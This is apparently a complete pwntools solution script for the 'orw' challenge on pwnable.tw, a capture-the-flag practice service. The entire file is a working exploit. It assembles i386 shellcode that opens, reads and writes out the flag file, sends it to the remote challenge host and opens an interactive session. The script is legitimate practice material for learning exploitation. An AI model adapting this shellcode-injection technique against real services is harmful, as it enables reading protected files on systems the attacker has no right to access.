from pwn import *

shellcode = shellcraft.i386.pushstr("/home/orw/flag")
shellcode += shellcraft.i386.linux.open(file='esp', oflag=0, mode='O_RDONLY')
shellcode += shellcraft.i386.linux.read(fd="eax", buf="ebx", nbytes=64)
shellcode += shellcraft.i386.linux.write(fd=1, buf="esp", n=64)

r = remote("chall.pwnable.tw", 10001)
r.recvuntil(":")
r.sendline(asm(shellcode))

r.interactive()